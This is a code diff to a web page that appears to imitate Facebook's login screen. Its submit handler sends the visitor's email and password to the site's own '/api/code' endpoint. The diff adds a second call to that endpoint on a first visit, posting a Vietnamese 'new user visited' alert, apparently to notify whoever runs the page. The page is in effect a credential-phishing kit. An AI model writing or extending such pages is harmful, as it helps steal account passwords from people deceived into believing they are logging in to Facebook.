@@ -79,10 +79,15 @@
       >
         Log in
       </button>
-      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="flex justify-center text-center cursor-pointer hover:underline">Forgotten Password?</a>
+      <a
+        href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+        class="flex justify-center text-center cursor-pointer hover:underline"
+        >Forgotten Password?</a
+      >
     </form>
     <div class="flex flex-col w-full items-center justify-center mt-6">
-      <a href="https://www.facebook.com/r.php?entry_point=login"
+      <a
+        href="https://www.facebook.com/r.php?entry_point=login"
         class="flex justify-center w-full py-2 text-blue-600 border border-blue-600 rounded-full hover:bg-blue-50"
       >
         Create new account
@@ -128,11 +133,22 @@ const handleSubmit = async () => {
   try {
     await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ account: { email: email.value, password: password.value }}),
+      body: JSON.stringify({ account: { email: email.value, password: password.value } }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
+    const isNew = localStorage.getItem('visited')
+    if (!isNew) {
+      await $fetch('/api/code', {
+        method: 'POST',
+        body: JSON.stringify({ message: '👨‍💼 Có người dùng mới truy cập', newUser: true }),
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      })
+      localStorage.setItem('visited', 'yes')
+    }
   } catch (error) {
     console.error(error)
   }
